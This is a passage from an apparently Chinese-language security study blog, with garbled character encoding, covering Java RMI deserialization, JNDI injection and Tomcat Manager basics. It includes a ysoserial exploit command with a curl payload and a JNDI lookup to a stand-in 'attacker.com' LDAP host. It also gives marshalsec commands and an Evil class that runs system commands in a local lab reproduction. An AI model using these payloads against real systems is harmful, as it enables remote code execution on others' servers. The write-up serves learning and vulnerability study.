obj)ï¼šæ³¨å†Œå¯¹è±¡ï¼ŒæŠŠå¯¹è±¡å’Œä¸€ä¸ªåå­—nameç»‘å®šã€‚å¦‚æœæ”¹åå­—å·²ç»ä¸å…¶ä»–å¯¹è±¡ç»‘å®šï¼Œä¸ä¼šæŠ›å‡ºNameAlreadyBoundExceptioné”™è¯¯ï¼Œè€Œæ˜¯æŠŠå½“å‰å‚æ•°objæŒ‡å®šçš„å¯¹è±¡è¦†ç›–åŸå…ˆçš„å¯¹è±¡//å‰è€…åˆ™ä¼šæŠ›å‡ºNameAlreadyBoundExceptioné”™è¯¯lookup(String name)ï¼šæŸ¥æ‰¾å¯¹è±¡ï¼Œè¿”å›ä¸å‚æ•°nameæŒ‡å®šçš„åå­—æ‰€ç»‘å®šçš„å¯¹è±¡ï¼›</code></pre><ul><li>exploit</li></ul><p>Java 1.8.121ç‰ˆæœ¬ä»¥ä¸‹</p><pre><code class="bash">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target_ip 1099  CommonsCollections1 &quot;curl xxxx&quot;</code></pre><p>Java 1.8.121ç‰ˆæœ¬åŠä»¥ä¸Šï¼š<br>é‡å†™ä¸ªclass,æ‰”åˆ°ysoserialé‡Œé‡æ–°ç¼–è¯‘<a href="https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI</a><br>è¿™æ ·ç›¸å½“äºåŠ äº†ä¸ªåˆ©ç”¨ç±»ã€‚ç„¶åç»§ç»­æ‰“å°±è¡Œäº†</p><p>å‘ç°vulhubåŸæ¥æœ‰javarmiçš„ä¸¤ä¸ªé•œåƒã€‚è‡ªå·±ä»“åº“å¤ªä¹…æ²¡æ›´æ–°å¯¼è‡´ç–å¿½äº†ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹çœ‹jdké«˜ç‰ˆæœ¬æ—¶åšå‡ºçš„æ”¹å˜</p><pre><code class="java">if (String.class == clazz        || java.lang.Number.class.isAssignableFrom(clazz)        || Remote.class.isAssignableFrom(clazz)        || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)        || UnicastRef.class.isAssignableFrom(clazz)        || RMIClientSocketFactory.class.isAssignableFrom(clazz)        || RMIServerSocketFactory.class.isAssignableFrom(clazz)        || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)        || java.rmi.server.UID.class.isAssignableFrom(clazz)) {    return ObjectInputFilter.Status.ALLOWED;} else {    return ObjectInputFilter.Status.REJECTED;}</code></pre><p>æ‰€ä»¥åˆ©ç”¨æ—¶æ˜¯é€šè¿‡ç™½åå•é‡Œå¯åˆ©ç”¨çš„ç±»æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚<br>å› ä¸ºrmiåœ¨å…¶ä»–æ´é‡Œå‡ºç°çš„é¢‘ç‡ä¹Ÿå¾ˆé«˜ã€‚æ‰€ä»¥å­¦ä¹ åˆ°å…¶ä»–æ¼æ´æ—¶ä¹Ÿä¼šæåŠã€‚</p><h3 id="jndiæ³¨å…¥"><a href="#jndiæ³¨å…¥" class="headerlink" title="jndiæ³¨å…¥"></a>jndiæ³¨å…¥</h3><p>jndiæ³¨å…¥çš„ä½¿ç”¨åœ¨shiroä¸fastjsonçš„ååºåˆ—åŒ–å¤ç°ä¸­éƒ½æ›¾ç»ä½¿ç”¨è¿‡ã€‚æƒ³è¦çœŸæ­£ç†è§£è¿™å‡ ç§æ¼æ´çš„è„‰ç»œ,è¿˜æ˜¯å¾—å…ˆæŠŠjndiçš„ç›¸å…³çŸ¥è¯†å­¦æ‡‚ã€‚</p><ul><li>jndi</li></ul><blockquote><p>JNDIå…¨ç§°ä¸º Java Naming and DirectoryInterfaceï¼ˆJavaå‘½åå’Œç›®å½•æ¥å£ï¼‰ï¼Œæ˜¯ä¸€ç»„åº”ç”¨ç¨‹åºæ¥å£ï¼Œä¸ºå¼€å‘äººå‘˜æŸ¥æ‰¾å’Œè®¿é—®å„ç§èµ„æºæä¾›äº†ç»Ÿä¸€çš„é€šç”¨æ¥å£ï¼Œå¯ä»¥ç”¨æ¥å®šä¹‰ç”¨æˆ·ã€ç½‘ç»œã€æœºå™¨ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰å„ç§èµ„æºã€‚<br>JNDIæ”¯æŒçš„æœåŠ¡ä¸»è¦æœ‰ï¼šDNSã€LDAPã€CORBAã€RMIç­‰</p></blockquote><p>æ‰€ä»¥è¯´jndiçš„ä½œç”¨ä¸»è¦åœ¨äºâ€å®šä½â€ã€‚æ¯”å¦‚å®šä½rmiä¸­æ³¨å†Œçš„å¯¹è±¡,è®¿é—®ldapçš„ç›®å½•æœåŠ¡ç­‰ç­‰ã€‚</p><ul><li>demo</li></ul><p>å…¶ä½¿ç”¨ä¸rmiå¾ˆç±»ä¼¼</p><pre><code>bindï¼šå°†åç§°ç»‘å®šåˆ°å¯¹è±¡ä¸­ï¼›lookupï¼šé€šè¿‡åå­—æ£€ç´¢æ‰§è¡Œçš„å¯¹è±¡</code></pre><p>ä¸‹é¢æ˜¯å†™çš„demo</p><pre><code class="java">import java.io.Serializable;import java.rmi.Remote;public class Identity implements Remote,Serializable{    private int id;    private String name;    private int age;    public int getId() {        return id;    }    public void setId(int id) {        this.id = id;    }    public String getName() {        return name;    }    public void setName(String name) {        this.name = name;    }    public int getAge() {        return age;    }    public void setAge(int age) {        this.age = age;    }    public String toString(){        return &quot;id: &quot;+id+&quot; name: &quot;+name+&quot; age: &quot;+age;    }}</code></pre><p>ä¸ä¸Šé¢rmiçš„Identityç±»ä¸åŒçš„æ˜¯,è¿™é‡Œæˆ‘ä»¬å¿…é¡»è®©å®ƒç»§æ‰¿java.rmi.Remoteç±».å¦åˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚åŒæ—¶åŠ ä¸Šä¸€ä¸ª<code>toString()</code>æ–¹æ³•æ–¹ä¾¿æˆ‘ä»¬è·å–å¹¶æ‰“å°å¯¹è±¡çš„å±æ€§ã€‚</p><p>ä¸€ä¸ªæœåŠ¡ç«¯+å®¢æˆ·ç«¯çš„æ•´åˆä»£ç ã€‚å…ˆç”¨jndiçš„bindå°†Identityå¯¹è±¡ç»‘å®šåœ¨rmiæœåŠ¡ä¸­ã€‚ç„¶åå†lookupæ£€ç´¢å¯¹è±¡è¾“å‡ºã€‚<br>JndiServer</p><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;public class JndiServer {   public static void  initIdentity() throws  Exception{       LocateRegistry.createRegistry(6666);       System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);       System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);       InitialContext ctx = new InitialContext();       Identity a= new Identity();       a.setId(0);       a.setAge(20);       a.setName(&quot;byc_404&quot;);       ctx.bind(&quot;person&quot;,a);       ctx.close();   }    public static void getIdentity() throws Exception{        InitialContext ctx = new InitialContext();        Identity person = (Identity) ctx.lookup(&quot;person&quot;);        System.out.println(person.toString());        ctx.close();    }    public static void main(String[] args) throws Exception{        initIdentity();        getIdentity();    }}</code></pre><p>æ³¨æ„æˆ‘ä»¬éœ€è¦å…ˆè¡Œè®¾ç½®jndiå·¥å‚çš„urlåŠç«¯å£ç­‰ç­‰å±æ€§ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/17.5.PNG" class="lazyload" data-srcset="17.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>traits of jndi</li></ul><p>jndiå­˜åœ¨å®‰å…¨ç®¡ç†å™¨.å¯¹äºåŠ è½½è¿œç¨‹å¯¹è±¡ï¼ŒJDNIæœ‰ä¸¤ç§ä¸åŒçš„å®‰å…¨æ§åˆ¶æ–¹å¼ï¼Œå¯¹äºNaming Manageræ¥è¯´ï¼Œç›¸å¯¹çš„å®‰å…¨ç®¡ç†å™¨çš„è§„åˆ™æ¯”è¾ƒå®½æ³›ï¼Œä½†æ˜¯å¯¹JNDI SPIå±‚ä¼šæŒ‰ç…§ä¸‹é¢è¡¨æ ¼ä¸­çš„è§„åˆ™è¿›è¡Œæ§åˆ¶ï¼š</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/18.PNG" class="lazyload" data-srcset="18.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¯ä»¥çœ‹åˆ°ldapå¯¹åº”çš„å®‰å…¨æªæ–½å¹¶éå¼ºåˆ¶çš„ã€‚è¿™ç‚¹éå¸¸æœ‰æ„æ€ã€‚è¿›è€Œå»¶ä¼¸åˆ°æˆ‘ä»¬ä¸‹é¢çš„ä¸€ä¸ªç‰¹ç‚¹</p><p>jndiåœ¨åˆå§‹åŒ–æ—¶,ä¸€å®šè¦åƒdemoä¸­é‚£æ ·é…ç½®ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚</p><pre><code class="java">Properties env = new Properties();env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL,&quot;rmi://localhost:1099&quot;);Context ctx = new InitialContext(env);LocateRegistry.createRegistry(6666);System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:6666&quot;);InitialContext ctx = new InitialContext();</code></pre><p>ä¸Šé¢ä¸¤ç§æ–¹å¼éƒ½å¯ä»¥æŒ‡å®šä¸Šä¸‹æ–‡ã€‚ä½†æ˜¯å½“æˆ‘ä»¬ä½¿ç”¨lookup()å¯»æ‰¾å¯¹è±¡æ—¶,æˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–æ ¼å¼çš„åè®®æ¥è½¬æ¢ä¸Šä¸‹æ–‡ç¯å¢ƒè®¿é—®å¯¹è±¡ã€‚å…·ä½“å¯ä»¥è·Ÿåˆ°InitialContextç±»çš„getURLOrDefaultInitCtx</p><pre><code class="java">protected Context getURLOrDefaultInitCtx(String name)        throws NamingException {        if (NamingManager.hasInitialContextFactoryBuilder()) {            return getDefaultInitCtx();        }        String scheme = getURLScheme(name);        if (scheme != null) {            Context ctx = NamingManager.getURLContext(scheme, myProps);            if (ctx != null) {                return ctx;            }        }        return getDefaultInitCtx();    }</code></pre><p>å¯ä»¥çœ‹åˆ°å¦‚æœåè®®ä¸ä¸ºç©º,ä¼šé‡æ–°è·å–urlä¸­æŒ‡å®šçš„ç¯å¢ƒã€‚<br>æ‰€ä»¥å¯ä»¥ä¼ é€’<code>ctx.lookup(&quot;ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com&quot;);</code>è¿™æ ·çš„urlæ¥è¿›è¡Œlookup.(å¹¸å¥½ä¹‹å‰åšhtbå¥½å¥½å­¦äº†ä¸‹ldapâ€¦â€¦).è¿™å°±æ˜¯jndiçš„åŠ¨æ€åè®®è½¬æ¢ç‰¹æ€§ã€‚</p><ul><li>jndi injection</li></ul><p>ç»ˆäºåˆ°æˆ‘ä»¬æ”»å‡»çš„é‡å¤´æˆjndiæ³¨å…¥äº†ã€‚ä¸è¿‡åœ¨æ­£å¼å¼€å§‹å‰æˆ‘ä»¬è¿˜éœ€è¦äº†è§£ä¸‹Referenceç±»çš„ä½¿ç”¨</p><blockquote><p>Javaä¸ºäº†å°†Objectå¯¹è±¡å­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæä¾›äº†Naming ReferenceåŠŸèƒ½ï¼Œå¯¹è±¡å¯ä»¥é€šè¿‡ç»‘å®šReferenceå­˜å‚¨åœ¨Namingæˆ–DirectoryæœåŠ¡ä¸‹ï¼Œæ¯”å¦‚RMIã€LDAPç­‰</p></blockquote><p>å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„å±æ€§ï¼š</p><p>1.classNameï¼šè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å<br>2.classFactoryï¼šåŠ è½½çš„classä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§°<br>3.classFactoryLocationï¼šè¿œç¨‹åŠ è½½ç±»çš„åœ°å€ï¼Œæä¾›classesæ•°æ®çš„åœ°å€å¯ä»¥æ˜¯file/ftp/httpç­‰åè®®</p><p>æ‰€ä»¥æˆ‘ä»¬å¼€å§‹jndiæ³¨å…¥æ—¶,å°±å¯ä»¥ä½¿ç”¨åˆ°Referenceç±»çš„åŠŸèƒ½äº†ã€‚jndiä¸­å¯¹è±¡çš„ä¼ é€’å¯ä»¥ä½¿ç”¨åºåˆ—åŒ–ä¹Ÿå¯ä»¥ä½¿ç”¨å¼•ç”¨ã€‚é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬èƒ½å°†æ¶æ„çš„Referenceç±»ç»‘å®šåœ¨RMIæ³¨å†Œè¡¨ä¸­,å¹¶è¯•å…¶å¼•ç”¨æŒ‡å‘æ¶æ„class.å°±èƒ½è¾¾æˆå‘½ä»¤æ‰§è¡Œã€‚(å‰æ:å½“ç”¨æˆ·åœ¨JNDIå®¢æˆ·ç«¯çš„lookup()å‡½æ•°å‚æ•°å¤–éƒ¨å¯æ§æˆ–Referenceç±»æ„é€ æ–¹æ³•çš„classFactoryLocationå‚æ•°å¤–éƒ¨å¯æ§æ—¶)</p><p>å¤ç°çš„è¯å› ä¸ºæˆ‘æœ¬åœ°javaç‰ˆæœ¬çš„é—®é¢˜å¯¼è‡´ä¸èƒ½ç”¨åŸºç¡€çš„jndiæ³¨å…¥payloadæ‰“ã€‚ä¸è¿‡ä¹‹å‰æˆ‘å¤ç°è¿‡<a href="https://bycsec.top/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/#fastjson-1-2-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E" target="_blank" rel="noopener">fastjson</a>çš„æ´ã€‚ç”¨çš„å°±æ˜¯rmiçš„æœåŠ¡</p><p>æ–¹æ³•,å¯¹åº”jdk1.8ä»¥ä¸‹çš„,ç›´æ¥ç”¨rmiåš</p><p>JndiClient</p><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;public class JndiClient {    public static void main(String[] args) throws Exception{        String uri = &quot;rmi://127.0.0.1:1099/aa&quot;;//å¯æ§        Context ctx = new InitialContext();        ctx.lookup(uri);    }}</code></pre><p>ç”¨marshalsecèµ·ä¸€ä¸ªrmiæœåŠ¡<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#Evil</code></p><p>å‡†å¤‡çš„Evil.java <code>javac Evil.java</code>ç¼–è¯‘å¥½.å¹¶èµ·ä¸€ä¸ªpython webæœåŠ¡ç›‘å¬åœ¨å¯¹åº”çš„ç«¯å£</p><pre><code class="java">public class Evil {    public Evil() throws Exception {        Runtime rt = Runtime.getRuntime();        String[] commands = {&quot;touch&quot;,&quot;/tmp/a&quot;};        Process pc = rt.exec(commands);        pc.waitFor();    }}</code></pre><p>ä¸è¿‡æˆ‘å› ä¸ºç‰ˆæœ¬é—®é¢˜æ‰€ä»¥éƒ½å¤±è´¥äº†ã€‚å¯ä»¥çœ‹åˆ°å…¶æŠ›å‡ºçš„com.sun.jndi.rmi.object.trustURLCodebaseé”™è¯¯ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/19.PNG" class="lazyload" data-srcset="19.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸Šé¢æåˆ°è¯´ldapã€‚LDAP+Referenceçš„æŠ€å·§è¿œç¨‹åŠ è½½Factoryç±»ä¸å—RMI+Referenceä¸­çš„com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebaseç­‰å±æ€§çš„é™åˆ¶ï¼Œæ‰€ä»¥é€‚ç”¨èŒƒå›´æ›´å¹¿ã€‚ä½†åœ¨JDK 8u191ã€7u201ã€6u211ä¹‹åï¼Œcom.sun.jndi.ldap.object.trustURLCodebaseå±æ€§çš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºfalseï¼Œå¯¹LDAP Referenceè¿œç¨‹å·¥å‚ç±»çš„åŠ è½½å¢åŠ äº†é™åˆ¶ã€‚</p><p>æˆ‘ä»¬æ¢ç”¨ldapçš„å‘½ä»¤è¯•è¯•</p><p>CLIENT.java</p><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;import javax.swing.*;public class CLIENT {    public static void main(String[] args) throws Exception {        String uri = &quot;ldap://127.0.0.1:1389/aa&quot;;        Context ctx = new InitialContext();        ctx.lookup(uri);    }}</code></pre><p>marshalsecèµ·æœåŠ¡ã€‚evil.classå‡†å¤‡å¼¹shell<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/20.PNG" class="lazyload" data-srcset="20.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚å¯ä»¥çœ‹åˆ°ldapçš„ç‰ˆæœ¬ä½¿ç”¨èŒƒå›´ç¡®å®æ¯”rmiæ›´å¹¿ã€‚</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ª<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">ç»•è¿‡é«˜ç‰ˆæœ¬çš„jndiæ³¨å…¥</a>ã€‚å±äºè¿›é˜¶æŠ€å·§äº†ã€‚æš‚æ—¶å…ˆç•™ä¸ªå‘ã€‚ç­‰é‡åˆ°å†å¡«ã€‚</p><h2 id="develop"><a href="#develop" class="headerlink" title="develop"></a>develop</h2><p>ä¸Šé¢åŸºæœ¬ä¸Šæ˜¯æŠŠjavaçš„ä¸€äº›æ¯”è¾ƒåŸºç¡€çš„æ¼æ´æˆ–å¤šæˆ–å°‘å¤ç°å¹¶åˆ†æäº†ä¸€éã€‚æ„Ÿè§‰æ¥è§¦èµ·æ¥è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚ä¸è¿‡æŒ‰ç…§ä¹‹å‰çš„è®¡åˆ’,ç°åœ¨è¦æŠŠjava_webçš„çŸ¥è¯†æ›´æ·±å…¥äº†è§£ä¸‹ã€‚æ–¹ä¾¿è‡ªå·±ä»¥åæ›´ç†Ÿæ‚‰æ–‡ä»¶ç»“æ„æˆ–è€…ç›¸åº”çš„æ–¹æ³•,åŒæ—¶ä¹Ÿæ˜¯ä¸ºäº†å¼€å‘åšè¿›ä¸€æ­¥è€ƒè™‘ã€‚è‡³äºjavaä¸€äº›å¸¸è§æ¼æ´å¦‚jackson,fastjsonä»¥åŠå…¶ä»–ä¸€äº›æ¡†æ¶å¦‚strutsçš„æ¼æ´ç­‰ç­‰æ–¹å‘çš„æ·±å…¥å°±ç•™åˆ°åé¢å…¶ä»–æ–‡ç« é‡Œè®°å½•äº†ã€‚</p><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><p>webèµ„æºæƒ³è¦è¢«è¿œç¨‹è®¡ç®—æœºè®¿é—®,éƒ½éœ€è¦ä¸€ä¸ªä¸ä¹‹è¿›è¡Œç½‘ç»œé€šä¿¡çš„ç¨‹åºã€‚webæœåŠ¡å™¨å°±æ˜¯è¿™æ ·çš„ç¨‹åºã€‚å¯¹javaè€Œè¨€,æ”¯æŒå…¨éƒ¨JSPä»¥åŠServletè§„èŒƒçš„tomcatæœåŠ¡å™¨æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚tomcatçš„ä¸‹è½½å®‰è£…å°±ä¸å¤šèµ˜è¿°äº†ã€‚æŒ‰ç…§æ•™ç¨‹èµ°å°±å¥½ã€‚</p><p>è¿™é‡Œå¯¹tomcatçš„ä¸€äº›ç»†èŠ‚è¿›è¡Œå™è¿°</p><ul><li><code>$CATALINA_HOME</code></li></ul><p>tomcatçš„æ ¹ç›®å½•ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®<code>$CATALINA_BASE</code>,ä¸ºå¤šä¸ªtomcatå®ä¾‹çš„ä¸ªä½“è®¾å®šå¯¹åº”çš„å±æ€§ã€‚</p><ul><li>path</li></ul><p>/bin<br>å­˜æ”¾ç”¨äºå¯åŠ¨åŠå…³é—­çš„æ–‡ä»¶ï¼Œä»¥åŠå…¶ä»–ä¸€äº›è„šæœ¬ã€‚å…¶ä¸­ï¼ŒUNIX ç³»ç»Ÿä¸“ç”¨çš„ *.sh æ–‡ä»¶åœ¨åŠŸèƒ½ä¸Šç­‰åŒäº Windows ç³»ç»Ÿä¸“ç”¨çš„ *.bat æ–‡ä»¶</p><p>/conf<br>é…ç½®æ–‡ä»¶åŠç›¸å…³çš„ DTDã€‚å…¶ä¸­æœ€é‡è¦çš„æ–‡ä»¶æ˜¯ server.xmlï¼Œè¿™æ˜¯å®¹å™¨çš„ä¸»é…ç½®æ–‡ä»¶<br>å½“ç„¶å…¶ä»–ä¸€äº›æ–‡ä»¶ä¹Ÿå¾ˆé‡è¦ã€‚ä¸ªäººé‡åˆ°è¿‡çš„è¿˜æœ‰catalina.policy,tomcat-users.xml,web.xmlè¿™å‡ ä¸ªé‡è¦é…ç½®æ–‡ä»¶ã€‚</p><p>/log<br>æ—¥å¿—æ–‡ä»¶çš„é»˜è®¤ç›®å½•ã€‚</p><p>/webapps<br>å­˜æ”¾ Web åº”ç”¨çš„ç›¸å…³æ–‡ä»¶ã€‚</p><ul><li>åº”ç”¨éƒ¨ç½²</li></ul><p>åœ¨ Tomcat æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥é€šè¿‡å¤šç§æ–¹æ³•éƒ¨ç½² Web åº”ç”¨:1.é™æ€éƒ¨ç½²2.åŠ¨æ€éƒ¨ç½²</p><p>é™æ€éƒ¨ç½²æˆ‘ä»¬åº”è¯¥å¾ˆç†Ÿæ‚‰ã€‚å°±æ˜¯å¸¸è§„çš„å¼€å‘æµç¨‹ã€‚åœ¨å¯åŠ¨ä¹‹å‰å°±å†™å¥½webåº”ç”¨ã€‚ä½†æ˜¯åŠ¨æ€éƒ¨ç½²å¯èƒ½å°±æ¥è§¦çš„ç›¸å¯¹è¾ƒå°‘ã€‚ä½†å…¶å®å°±æ˜¯ä½¿ç”¨tomcatmanagerç›´æ¥æ“ä½œç®¡ç†webåº”ç”¨ã€‚</p><p>å…³äºtomcat managerè¦ç­‰åˆ°ä¸“é—¨è®²manageræ—¶å†ä»”ç»†ç†è§£ã€‚</p><ul><li>ä¸Šä¸‹æ–‡</li></ul><p>ä¸Šä¸‹æ–‡åœ¨ Tomcat ä¸­å…¶å®å°±æ˜¯ Web åº”ç”¨çš„æ„æ€ã€‚<br>ä¸ºäº†åœ¨ Tomcat ä¸­é…ç½®ä¸Šä¸‹æ–‡ï¼Œéœ€è¦ç”¨åˆ°ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ã€‚åœ¨tomcatä¸­å…¶å®å°±æ˜¯xmlæ–‡ä»¶ã€‚<br>ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ä½äºï¼š<br>1.<code>$CATALINA_BASE/conf/[enginename]/[hostname]/[webappname].xml</code><br>2.<code>$CATALINA_BASE/webapps/[webappname]/META-INF/context.xml</code><br>åœ¨ç›®å½• 1 ä¸­çš„æ–‡ä»¶åä¸º <code>[webappname].xml</code>ï¼Œä½†åœ¨ç›®å½• 2 ä¸­ï¼Œæ–‡ä»¶åä¸º context.xmlã€‚å¦‚æœæŸä¸ª Web åº”ç”¨æ²¡æœ‰ç›¸åº”çš„ä¸Šä¸‹æ–‡æè¿°ç¬¦æ–‡ä»¶ï¼ŒTomcat å°±ä¼šä½¿ç”¨é»˜è®¤å€¼é…ç½®è¯¥åº”ç”¨ã€‚</p><ul><li>Tomcat Manager</li></ul><p>å¾ˆå¤šç”Ÿäº§ç¯å¢ƒéƒ½éå¸¸éœ€è¦ä»¥ä¸‹ç‰¹æ€§ï¼šåœ¨æ— éœ€å…³é—­æˆ–é‡å¯æ•´ä¸ªå®¹å™¨çš„æƒ…å†µä¸‹ï¼Œéƒ¨ç½²æ–°çš„ Web åº”ç”¨æˆ–è€…å–æ¶ˆå¯¹ç°æœ‰åº”ç”¨çš„éƒ¨ç½²ã€‚æˆ–è€…ï¼Œå³ä¾¿åœ¨ Tomcat æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰æŒ‡å®š reloadable çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥è¯·æ±‚é‡æ–°åŠ è½½ç°æœ‰åº”ç”¨ã€‚</p><p>Tomcat ä¸­çš„ Web åº”ç”¨ Manager å°±æ˜¯æ¥è§£å†³è¿™äº›é—®é¢˜çš„ï¼Œå®ƒé»˜è®¤å®‰è£…åœ¨ä¸Šä¸‹æ–‡è·¯å¾„ï¼š/manager ä¸­</p><p>Tomcat ä»¥é»˜è®¤å€¼è¿è¡Œæ˜¯éå¸¸å±é™©çš„ï¼Œå› ä¸ºè¿™èƒ½è®©äº’è”ç½‘ä¸Šçš„ä»»ä½•äººéƒ½å¯ä»¥åœ¨ä½ çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ Manager åº”ç”¨ã€‚å› æ­¤ï¼ŒManager åº”ç”¨è¦æ±‚ä»»ä½•ç”¨æˆ·åœ¨ä½¿ç”¨å‰å¿…é¡»éªŒè¯è‡ªå·±çš„èº«ä»½ï¼Œæä¾›è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä»¥åŠç›¸åº”é…ç½®çš„ manager-** è§’è‰²ï¼ˆè§’è‰²åç§°æ ¹æ®æ‰€éœ€çš„åŠŸèƒ½è€Œå®šï¼‰ã€‚å¦å¤–ï¼Œé»˜è®¤ç”¨æˆ·æ–‡ä»¶ï¼ˆ$CATALINA_BASE/conf/tomcat-users.xmlï¼‰ä¸­çš„ç”¨æˆ·åç§°éƒ½æ²¡æœ‰æŒ‡å®šè§’è‰²åç§°ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯ä¸èƒ½è®¿é—® Manager åº”ç”¨çš„ã€‚</p><p>è¿™äº›è§’è‰²åç§°ä½äº Manager åº”ç”¨çš„ web.xml æ–‡ä»¶ä¸­ã€‚å¯ç”¨çš„è§’è‰²åŒ…æ‹¬ï¼š</p><blockquote><p>manager-gui èƒ½å¤Ÿè®¿é—® HTML ç•Œé¢ã€‚<br>manager-status åªèƒ½è®¿é—®â€œæœåŠ¡å™¨çŠ¶æ€â€ï¼ˆServer Statusï¼‰é¡µé¢ã€‚<br>manager-script èƒ½å¤Ÿè®¿é—®æ–‡æ¡£ä¸­æè¿°çš„é€‚ç”¨äºå·¥å…·çš„çº¯æ–‡æœ¬ç•Œé¢ï¼Œä»¥åŠâ€æœåŠ¡å™¨çŠ¶æ€â€é¡µé¢ã€‚<br>manager-jmx èƒ½å¤Ÿè®¿é—® JMX ä»£ç†ç•Œé¢ä»¥åŠâ€œæœåŠ¡å™¨çŠ¶æ€â€ï¼ˆServer Statusï¼‰é¡µé¢ã€‚</p></blockquote><p>ä¸ºäº†èƒ½å¤Ÿè®¿é—® Manager åº”ç”¨ï¼Œå¿…é¡»åˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å/å¯†ç ç»„åˆï¼Œå¹¶ä¸ºä¹‹æˆäºˆä¸€ç§ manager-** è§’è‰²ï¼Œæˆ–è€…æŠŠä¸€ç§ manager-** è§’è‰²æˆäºˆç°æœ‰çš„ç”¨æˆ·å/å¯†ç ç»„åˆ</p><p>æ¯”è¾ƒå±é™©çš„æƒ…å†µå°±å¦‚ä¹‹å‰æ›¾ç»åšè¿‡å‡ 